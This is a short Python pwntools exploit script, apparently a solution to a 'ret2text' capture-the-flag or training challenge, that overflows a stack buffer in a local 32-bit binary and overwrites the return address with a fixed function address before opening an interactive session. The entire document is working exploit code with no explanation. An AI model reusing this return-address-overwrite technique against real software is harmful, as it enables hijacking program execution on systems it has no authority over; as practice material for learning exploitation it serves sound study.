from pwn import *

io = process('./ret2text')
offset = 0x6c + 4


success_addr = 0x0804863A
payload = b'A' * offset  + p32(success_addr)
io.sendline(payload)
io.interactive()

